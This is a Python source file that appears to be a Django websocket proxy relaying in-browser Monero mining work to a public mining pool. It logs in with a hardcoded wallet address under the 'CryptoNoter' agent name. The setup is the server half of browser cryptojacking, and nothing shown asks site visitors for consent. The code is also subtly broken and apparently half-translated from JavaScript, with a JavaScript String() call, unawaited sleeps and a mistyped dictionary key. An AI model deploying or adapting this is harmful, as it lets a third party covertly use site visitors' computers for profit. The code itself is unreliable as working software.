import json, uuid, asyncio
from channels.generic.websocket import AsyncWebsocketConsumer
from asgiref.sync import sync_to_async

#'pool.hashvault.pro:80', #

conf = {
    'pool': 'gulf.moneroocean.stream:10032', #'pool.supportxmr.com:3333',
    'addr': '479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw',
    'pass': 'lotteh'
}

async def connect_pool(self):
    import websockets, os, socket
    global conf
    pool = conf['pool'].split(':')
    addr = socket.gethostbyname(pool[0])
    ws_url = 'ws://{}:{}'.format(pool[0],pool[1])
    from django.conf import settings
    tmp = ws_url.split('//')[1]
    hostname, port = tmp.split(':')
    port = int(port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((hostname, port))
    conn = {
        'uid': None,
        'pid': os.urandom(12).hex(),
        'workerId': None,
        'found': 0,
        'accepted': 0,
        'ws': self,
        'pl': sock
    }
    self.conn = conn
    params = {"login": conf['addr'], "pass": conf['pass'], "agent": 'CryptoNoter'}
    sock.send((json.dumps({'method':'login', 'params': params}) + '\n').encode())
    async def on_message(conn, ws, data):
        try:
            conn = self.conn
            linesdata = data;
            lines = String(linesdata).split("\n");
            if len(lines[1]) > 0:
                print('[<] Response: ' + conn['pid'] + '\n\n' + lines[0] + '\n');
                print('[<] Response: ' + conn['pid'] + '\n\n' + lines[1] + '\n')
                await pool2ws(conn, lines[0])
                await pool2ws(conn, lines[1])
            else:
                print('[<] Response: ' + conn['pid'] + '\n\n' + data + '\n');
                await pool2ws(conn, data)
        except:
            import traceback
            print(traceback.format_exc())

    async def receive(self, conn, sock):
        while self.connected:
            asyncio.sleep(1)
            data = await sock.recv(0)
            print(data)
            await on_message(conn, sock, data)

    self.rec_task = asyncio.create_task(receive(self, conn, sock))

async def ws2pool(conn, data):
    buf = None;
    import json
    data = json.loads(data)
    match data['type']:
        case 'auth':
            conn['uid'] = data['params']['site_key'];
            if data['params']['user']:
                conn['uid'] += '@' + data['params']['user']
            buf = {
                "method": "login",
                "params": {
                    "login": conf['addr'],
                    "pass": conf['pass'],
                    "agent": "CryptoNoter"
                },
                "id": conn['pid']
            }
            buf = json.dumps(buf) + '\n'
            conn['pl'].send(buf.encode())
        case 'submit':
            conn['found']+=1
            buf = {
                "method": "submit",
                "params": {
                    "id": conn['workerId'],
                    "job_id": data['params']['job_id'],
                    "nonce": data['param']['nonce'],
                    "result": data['params']['result']
                },
                "id": conn['pid']
            }
            buf = json.dumps(buf) + '\n'
            conn['pl'].send(buf.encode())

async def pool2ws(conn, data):
    try:
        buf = None
        import json
        data = json.loads(data)
        if data['id'] == conn['pid'] and data['result']:
            if data['result']['id']:
                conn['workerId'] = data['result']['id']
                buf = {
                    "type": "authed",
                    "params": {
                        "token": "",
                        "hashes": conn['accepted']
                    }
                }
                buf = json.dumps(buf);
                await conn['ws'].send(text_data=buf);
                buf = {
                    "type": "job",
                    "params": data['result']['job']
                }
                buf = json.dumps(buf);
                await conn['ws'].send(text_data=buf);
            elif data['result']['status'] == 'OK':
                conn['accepted']+=1
                buf = {
                    "type": "hash_accepted",
                    "params": {
                        "hashes": conn['accepted']
                    }
                }
                buf = json.dumps(buf)
                await conn['ws'].send(text_data=buf)
        if data['id'] == conn['pid'] and data['error']:
            if data['error']['code'] == -1:
                buf = {
                    "type": "banned",
                    "params": {
                        "banned": conn['pid']
                    }
                }
            else:
                buf = {
                    "type": "error",
                    "params": {
                        "error": data['error']['message']
                    }
                }
            buf = json.dumps(buf)
            await conn['ws'].send(text_data=buf)
        if data['method'] == 'job':
            buf = {
                "type": 'job',
                "params": data['params']
            }
            buf = json.dumps(buf)
            await conn['ws'].send(text_data=buf)
    except:
        import traceback
        print(traceback.format_exc())

class MiningProxyConsumer(AsyncWebsocketConsumer):
    conn = None
    ws = None
    socket_connected = False
    socket_connecting = False
    async def connect(self):
        self.connected = True
        await self.accept()

    async def disconnect(self, close_code):
        print('[!] ' + self.conn['uid'] + ' offline.\n')
        if self.conn:
            self.conn['pl'].close()
        self.rec_task.cancel()
        self.connected = False

    async def receive(self, text_data):
        if not self.socket_connecting:
            self.socket_connecting = True
            await connect_pool(self)
            self.socket_connected = True
        elif not self.socket_connected:
            while not self.socket_connected:
                asyncio.sleep(1)
        await ws2pool(self.conn, text_data)
        print('[>] Request: ' + self.conn['uid'] + '\n\n' + text_data + '\n')

